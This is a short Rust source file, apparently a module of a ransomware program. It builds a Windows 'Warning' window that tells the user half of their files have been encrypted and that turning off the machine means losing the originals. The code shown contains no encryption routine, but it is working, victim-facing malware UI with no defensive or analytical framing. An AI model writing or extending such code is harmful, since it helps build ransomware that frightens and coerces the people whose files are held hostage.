use native_windows_derive::NwgUi;
use native_windows_gui as nwg;
use nwg::NativeUi;
use std::rc::Rc;
use std::cell::RefCell;
use std::thread;

#[derive(Default, NwgUi)]
pub struct WarningWindow {
    #[nwg_control(size: (450, 220), position: (300, 100), title: "Warning", flags: "WINDOW|VISIBLE")]
    #[nwg_events(OnWindowClose: [WarningWindow::close])]
    window: nwg::Window,

    #[nwg_control(text: "WARNING", position: (20, 10), size: (410, 40), flags: "VISIBLE")]
    title: nwg::Label,

    #[nwg_control(text: "", position: (20, 60), size: (410, 140), flags: "VISIBLE|VSCROLL|AUTOVSCROLL", readonly: true)]
    warning_text: nwg::TextBox,
}

impl WarningWindow {
    fn close(&self) {
        nwg::stop_thread_dispatch();
    }
}

pub fn show_warning_window() {
    thread::spawn(|| {
        nwg::init().expect("Failed to init Native Windows GUI");

        let app = WarningWindow::build_ui(Default::default()).expect("Failed to build UI");

        app.warning_text.set_text("DO NOT TURN OFF YOUR MACHINE! \r\n\
    Half of your files have been encrypted and you won't be able to get the originals back if your machine shuts down.");

        nwg::dispatch_thread_events();
    });
}
